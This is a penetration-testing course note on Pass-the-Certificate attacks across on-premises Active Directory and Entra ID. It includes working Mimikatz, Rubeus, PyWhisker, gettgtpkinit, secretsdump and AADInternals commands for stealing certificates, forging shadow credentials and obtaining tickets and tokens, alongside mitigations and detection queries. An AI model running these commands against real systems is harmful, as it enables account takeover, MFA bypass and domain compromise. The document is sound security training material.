---
tags: [active-directory, azure, hybrid, exchange, vapt]
difficulty: expert
module: "65 - Hybrid Identity, Entra ID, and Exchange environment Attacks"
topic: "65.06 Pass-the-Certificate in Hybrid Environments"
---

# Pass-the-Certificate in Hybrid Environments

## 1. Introduction to Hybrid Certificate-Based Authentication (CBA)

In modern enterprise architectures, integrating on-premises Active Directory (AD) with Microsoft Entra ID (formerly Azure AD) is standard practice. To facilitate seamless single sign-on (SSO) and strong authentication across both boundaries, organizations often deploy Certificate-Based Authentication (CBA). This relies heavily on Active Directory Certificate Services (AD CS) combined with Entra ID integration.

Pass-the-Certificate attacks in hybrid environments leverage compromised X.509 client authentication certificates to masquerade as the victim user. In a hybrid setting, obtaining a valid client certificate allows an attacker to authenticate not just to on-premises Kerberos (via PKINIT) but potentially directly to Entra ID, bypassing multifactor authentication (MFA) requirements and Conditional Access policies, provided CBA is trusted and configured to bypass or satisfy MFA claims.

This note delves deep into the mechanics of certificate extraction, abuse, and passing within the context of a hybrid identity model, focusing on the technical underpinnings of both the on-premises and cloud authentication protocols.

## 2. Architectural Overview and Attack Flow

When AD CS is synchronized or trusted by Entra ID, the Entra ID tenant is configured with the on-premises Root CA (and Intermediate CAs) as a trusted issuer. Users presenting a client certificate issued by this CA can authenticate to Azure services.

```text
+--------------------------------------------------------------------------------------------------+
|                                  Hybrid CBA Attack Architecture                                  |
+--------------------------------------------------------------------------------------------------+
|                                                                                                  |
|   [ Attacker Machine / Kali Linux ]                                                              |
|          |                                                                                       |
|          | (1) Extracts Certificate (Mimikatz / Rubeus / CAPI / DPAPI)                           |
|          |     Tools: mimikatz.exe, Certify.exe, Rubeus.exe                                      |
|          v                                                                                       |
|   [ Compromised Windows Endpoint ] -----+                                                        |
|          |                              |                                                        |
|          | (2) Pass-the-Cert            | (3) Pass-the-Cert                                      |
|          |     via PKINIT (AS-REQ)      |     via Azure AD CBA (mTLS)                            |
|          v                              v                                                        |
|   [ On-Premises AD Domain Controller ]  [ Microsoft Entra ID (certauth.login...) ]               |
|   (Validates via AD CS / NTAuth)        (Validates via Trusted Root CA / CRL)                    |
|          |                              |                                                        |
|          | (4) Issues TGT               | (4) Issues PRT / Access Token / ID Token               |
|          v                              v                                                        |
|   [ Internal Network Resources ]        [ M365 / Azure Cloud Resources ]                         |
|   (File Shares, SQL, Exchange)          (SharePoint, Exchange Online, Azure RM)                  |
|                                                                                                  |
+--------------------------------------------------------------------------------------------------+
```

### Key Components

1. **Active Directory Certificate Services (AD CS)**: The on-premises PKI infrastructure that issues certificates.
2. **Entra ID CBA Configuration**: The Entra ID tenant is configured to trust the on-premises CA. The Certificate Revocation List (CRL) must be accessible from the internet.
3. **Primary Refresh Token (PRT)**: Once authenticated via a certificate, the user receives a PRT, which provides SSO to other Azure/M365 services.
4. **PKINIT**: The Kerberos extension used for initial authentication using public key cryptography (RFC 4556).

## 3. Deep Dive: Entra ID CBA & AD CS Integration Mechanics

Entra ID Certificate-Based Authentication allows users to authenticate directly against Azure AD using X.509 certificates. The authentication flow operates as follows:

1. The client attempts to access an Entra ID-protected application (e.g., `portal.azure.com`).
2. The client is redirected to the Entra ID login page (`login.microsoftonline.com`).
3. If CBA is enabled, the user selects "Sign in with a certificate".
4. The browser redirects to a specialized endpoint: `certauth.login.microsoftonline.com`.
5. The browser prompts the user to select a client certificate from the Windows Certificate Store (`CERT_SYSTEM_STORE_CURRENT_USER`).
6. A mutual TLS (mTLS) session is established between the client and Entra ID.
7. Entra ID extracts the User Principal Name (UPN) or email from the certificate's Subject Alternative Name (SAN).
8. Entra ID verifies the certificate chain against its configured Trusted Certificate Authorities and checks the CRL for revocation status.
9. If valid, Entra ID issues the requested tokens (Access Token, Refresh Token, PRT) via the standard OAuth 2.0 / OpenID Connect flows.

From an attacker's perspective, this means that if a valid client certificate with Client Authentication EKU (Extended Key Usage - OID 1.3.6.1.5.5.7.3.2) is stolen, it can be imported into an attacker-controlled system to achieve direct cloud access as the victim. Because the certificate inherently satisfies strong authentication requirements, this often bypasses traditional MFA prompts.

## 4. Attack Vectors and Mechanisms

The fundamental requirement for Pass-the-Certificate is obtaining a valid private key associated with a client authentication certificate. There are multiple ways to achieve this:

1. **Extraction from the Windows Certificate Store**: If the attacker has elevated privileges (SYSTEM or local Administrator) on a host where the user is logged in, or if the key is marked as exportable, it can be extracted.
2. **DPAPI Abuse**: Keys marked as non-exportable are protected by the Data Protection API (DPAPI). Tools like Mimikatz can patch the CAPI/CNG memory space to make them exportable.
3. **Shadow Credentials**: An attacker with write access to the `msDS-KeyCredentialLink` attribute of an object can inject their own public key, effectively bypassing the CA and generating their own valid authentication material.
4. **AD CS Misconfigurations**: Vulnerable certificate templates (e.g., ESC1, ESC2, ESC8) allow an attacker to request a certificate on behalf of an arbitrary user, generating the private key locally.

## 5. Deep Dive: Extracting Certificates from the Host

When a user logs into a machine, their certificates may be stored in their personal certificate store. If the attacker gains SYSTEM or local Administrator privileges, they can extract these keys. Windows stores these keys in a protected state using DPAPI.

### Understanding CAPI and CNG

Windows uses two primary cryptographic APIs:
- **CryptoAPI (CAPI)**: The legacy API.
- **Cryptography Next Generation (CNG)**: The modern API.

When a certificate is marked as "non-exportable", it simply means that the CAPI/CNG functions check a flag in the key's metadata. If the flag is not set to `CRYPT_EXPORTABLE`, the export function returns an error. 

### Using Mimikatz (Patching CAPI/CNG)

To extract non-exportable certificates, Mimikatz patches the CAPI and CNG APIs in memory. It literally overwrites the instructions in the loaded DLLs (`crypt32.dll` and `ncrypt.dll`) so that the exportability check always returns true.

```powershell
# Elevate to SYSTEM or ensure high integrity
privilege::debug
token::elevate

# Patch CryptoAPI and CNG in memory
crypto::cng
crypto::capi

# Export certificates from the Current User store
crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_CURRENT_USER
```

This process generates `.pfx` (PKCS#12) files containing both the public certificate and the private key, saved to the local disk. The password for the `.pfx` file is typically set to `mimikatz`.

### Using Rubeus and DPAPI

If the attacker wishes to interact with DPAPI directly or request a new certificate using an existing session, tools like Rubeus can be leveraged. Rubeus can also monitor for incoming TGT requests and extract certificates if they are used for PKINIT.

## 6. Pass-the-Certificate to Entra ID

Once the `.pfx` file is obtained, it can be used to authenticate directly to Entra ID.

### Importing the Certificate

The attacker imports the `.pfx` file into their local Windows or Linux machine.
On Windows:
```powershell
$pwd = ConvertTo-SecureString "mimikatz" -AsPlainText -Force
Import-PfxCertificate -FilePath .\extracted_cert.pfx -CertStoreLocation Cert:\CurrentUser\My -Password $pwd
```

On Linux, the `.pfx` can be converted to PEM format using OpenSSL:
```bash
openssl pkcs12 -in extracted_cert.pfx -nocerts -out key.pem -nodes
openssl pkcs12 -in extracted_cert.pfx -nokeys -out cert.pem
```

### Authenticating to M365/Azure

With the certificate imported, the attacker simply navigates to `portal.azure.com` or `myapps.microsoft.com` from their browser.
When prompted, they select "Sign in with a certificate" and choose the imported certificate.

Alternatively, this can be automated using tools like `AADInternals` or custom Python scripts utilizing the `msal` library, presenting the certificate during the OAuth2 device code flow or directly against the token endpoint.

```powershell
# Using AADInternals to get an access token via certificate
Import-Module AADInternals
$cert = Get-PfxCertificate -FilePath .\extracted_cert.pfx
$token = Get-AADIntAccessTokenForAADGraph -Certificate $cert

# Using the token to interact with the environment
Connect-AzureAD -AadAccessToken $token
```

## 7. Pass-the-Certificate via PKINIT (On-Premises)

Simultaneously, the same certificate can be used to authenticate to the on-premises domain controllers to obtain a Kerberos TGT. This is known as PKINIT (Public Key Cryptography for Initial Authentication in Kerberos).

```powershell
# Using Rubeus to request a TGT using the extracted certificate
Rubeus.exe asktgt /user:VICTIM_USER /certificate:extracted_cert.pfx /password:mimikatz /nowrap
```

This returns a base64-encoded TGT for the victim. The attacker can then pass-the-ticket (PtT) to access on-premises resources (e.g., file shares, SQL databases, domain controllers).

```powershell
# Injecting the requested TGT into the current logon session
Rubeus.exe ptt /ticket:base64_ticket_string
```

If the environment uses NTLM, Rubeus can also extract the NT hash from the PAC (Privilege Attribute Certificate) returned during the PKINIT process, allowing for traditional Pass-the-Hash attacks.

## 8. Shadow Credentials in Hybrid Environments

A more advanced variation of Pass-the-Certificate involves abusing the `msDS-KeyCredentialLink` attribute. This attribute is primarily used for Windows Hello for Business (WHfB) and allows public keys to be mapped directly to an AD object.

If an attacker compromises an account that has `GenericWrite`, `GenericAll`, or `WriteProperty` over a target user or computer object, they can write their own public key to the target's `msDS-KeyCredentialLink` attribute.

### Execution via Whisker or PyWhisker

1. **Generate and Inject Key**:
```bash
# Using PyWhisker from a Linux attacking machine
pywhisker.py -d "domain.local" -u "attacker" -p "password" --target "DC01$" --action "add"
```
This generates an RSA key pair, wraps the public key in a KeyCredential structure, and writes it to `DC01$`.

2. **Obtain TGT via PKINIT**:
```bash
# Requesting a TGT using the newly generated certificate
gettgtpkinit.py domain.local/DC01\$ -cert-pfx DC01.pfx -pfx-pass pywhisker DC01.ccache
```

3. **Pass-the-Ticket**:
```bash
# Using the TGT to dump secrets
export KRB5CCNAME=DC01.ccache
secretsdump.py -k domain.local/DC01\$@DC01.domain.local
```

### Hybrid Impact of Shadow Credentials

Because Azure AD Connect synchronizes specific attributes and objects, changes to on-premises objects might allow an attacker to pivot into the cloud environment. While `msDS-KeyCredentialLink` is not synchronized by default to Entra ID in a way that allows direct cloud authentication, compromising an on-premises synchronization account (like the MSOL_ account) via Shadow Credentials allows the attacker to manipulate objects that *are* synced to the cloud.

## 9. Mitigations

Defending against Pass-the-Certificate requires a defense-in-depth approach spanning endpoints, AD CS, and Entra ID.

1. **Hardware-Backed Keys**:
   Enforce the use of TPM (Trusted Platform Module) or hardware security keys (e.g., YubiKeys) for storing private keys. If the private key is bound to the hardware and marked as non-exportable at the hardware level, Mimikatz and DPAPI patching cannot extract it.
   - Deploy smart card logon or WHfB with hardware-bound keys.

2. **Restrict Certificate Exportability and Credential Guard**:
   While CAPI patching bypasses software-level "non-exportable" flags, utilizing Virtualization-Based Security (VBS) and Windows Defender Credential Guard can protect keys and Kerberos tickets in isolated memory enclaves, preventing extraction even by a SYSTEM level attacker.

3. **Secure AD CS Templates**:
   Regularly audit AD CS templates using tools like `Certify` or `BloodHound`. Ensure no templates allow for arbitrary Subject Alternative Names (SANs) (ESC1) or overly permissive enrollment rights (ESC4).

4. **Entra ID Conditional Access Policies**:
   - Tie CBA to compliant devices. Even if an attacker steals a certificate, they cannot use it from a non-compliant, non-hybrid joined machine.
   - Restrict certificate authentication to known IP ranges or trusted locations.
   - Enforce Phishing-Resistant MFA explicitly.

5. **Monitor msDS-KeyCredentialLink**:
   Restrict who has `GenericWrite` or `WriteProperty` permissions on critical objects (Domain Admins, Domain Controllers) in Active Directory.

## 10. Extensive Detections

Detecting certificate abuse involves monitoring endpoint API calls, AD CS issuance logs, and Entra ID sign-in logs.

### On-Premises Detection (Windows Event Logs)

- **Event ID 4886 (AD CS)**: Certificate Services received a certificate request. Look for suspicious SANs or unexpected templates being requested by users.
- **Event ID 4887 (AD CS)**: Certificate Services approved and issued a certificate.
- **Event ID 4768 (Active Directory)**: A Kerberos authentication ticket (TGT) was requested. Monitor the `CertThumbprint` field. If a user requests a TGT from an IP address that does not match their normal workstation, investigate immediately.
- **Event ID 5136 (Active Directory)**: A directory service object was modified. Monitor changes to the `msDS-KeyCredentialLink` attribute. Only authorized administrative tools or WHfB enrollment processes should modify this.

### Entra ID Detection (KQL)

Monitor Azure AD Sign-in logs for unexpected Certificate-Based Authentication events. The following KQL query identifies CBA authentications originating from non-trusted IPs.

```kusto
SigninLogs
| where AuthenticationDetails has "Certificate"
| extend authMethod = parse_json(AuthenticationDetails)
| mv-expand authMethod
| where authMethod.authenticationMethod == "Certificate"
| project TimeGenerated, UserPrincipalName, IPAddress, Location, AppDisplayName, UserAgent, DeviceDetail
| where IPAddress !in (TrustedCorporateIPs) // Filter out known corporate IPs
| sort by TimeGenerated desc
```

Monitor for rapid, geographically improbable logons using certificates, as well as CBA authentications originating from anonymous proxies, VPNs, or Tor exit nodes.

### Endpoint Detection (Sysmon)

Monitor for Mimikatz-like behavior targeting CAPI and CNG processes.
- **Sysmon Event ID 10 (Process Access)**: Look for unusual processes requesting access to `lsass.exe` with specific access masks (e.g., `0x1010` or `0x1410`).
- **Sysmon Event ID 11 (File Create)**: Monitor for the sudden creation of `.pfx` files in user directories, particularly by processes running as SYSTEM.

## 11. Chaining Opportunities

- **[[02 - AD CS ESC1-8 Vulnerabilities]]**: Use ESC1 to generate a certificate for a Domain Admin, then use this note's techniques to Pass-the-Certificate to Entra ID to compromise the global tenant.
- **[[04 - Golden SAML in Hybrid Architectures]]**: Extracting certificates might also provide the token-signing certificate used by ADFS, leading to Golden SAML attacks which provide persistent cloud access.
- **[[08 - ProxyLogon Chaining]]**: Leverage Exchange vulnerabilities to dump SYSTEM memory, extracting stored certificates of Exchange servers or administrative users.
- **[[15 - Coercion Techniques (PetitPotam, ShadowCoerce)]]**: Coerce authentications to AD CS web enrollment endpoints (ESC8) to obtain a certificate for a machine account, then pass it.

## 12. Related Notes

- [[01 - Active Directory Certificate Services (AD CS) Overview]]
- [[03 - Entra ID Authentication Mechanisms]]
- [[05 - Windows Hello for Business (WHfB) Internals]]
- [[12 - Lateral Movement via DCOM and WMI]]
- [[18 - Advanced DPAPI Exploitation]]

## Real-World Attack Scenario
## Real-World Attack Scenario: Certificate Theft to Cloud Admin

**The Context:** A penetration testing team is assessing a financial institution that has implemented a strict Zero Trust architecture. They enforce Certificate-Based Authentication (CBA) for all Microsoft 365 access, meaning passwords are no longer used for cloud logins. The team has compromised a workstation belonging to a Cloud Operations Engineer via a client-side phishing payload. The engineer has a smartcard, but they also have a software-based client certificate stored on their machine for automated script authentication.

**The Reconnaissance:** 
The attacker elevates privileges to `NT AUTHORITY\SYSTEM` on the compromised Windows 11 endpoint. They query the Windows Certificate Store (`CERT_SYSTEM_STORE_CURRENT_USER`) and identify a highly privileged client certificate with the Client Authentication EKU. However, the certificate is marked as "non-exportable," meaning standard Windows APIs will prevent the private key from being extracted.

**The Execution:**
1. **DPAPI Patching:** To bypass the export restriction, the attacker runs `Mimikatz`. They execute `crypto::cng` and `crypto::capi` to dynamically patch the Cryptography API and CNG DLLs in LSASS memory, effectively forcing the exportability check to return true.
2. **Extraction:** With the APIs patched, the attacker runs `crypto::certificates /export`, successfully extracting the engineer's client certificate and private key into a `.pfx` file, protected by the default password "mimikatz".
3. **Exfiltration & Setup:** The attacker exfiltrates the `.pfx` file to their external Linux attacking machine and convert it to PEM format using `openssl`.
4. **Cloud Authentication:** The attacker utilizes the `msal` Python library or `AADInternals` to initiate an authentication request to Entra ID (`certauth.login.microsoftonline.com`). They present the extracted client certificate during the mutual TLS (mTLS) handshake.
5. **Bypassing Controls:** Entra ID validates the certificate against the trusted on-premises AD CS Root CA. Because CBA inherently satisfies strong authentication (MFA) claims, Entra ID issues the requested Access Token and Primary Refresh Token (PRT).

**The Outcome:**
The attacker successfully executed a Pass-the-Certificate attack, bypassing the organization's passwordless and MFA protections. Armed with the engineer's PRT, the attacker pivots into the Azure Portal, gaining administrative access to the underlying Azure Resource Manager (ARM), where they proceed to deploy unauthorized virtual machines and exfiltrate customer databases stored in Azure SQL, completely compromising the hybrid trust model.

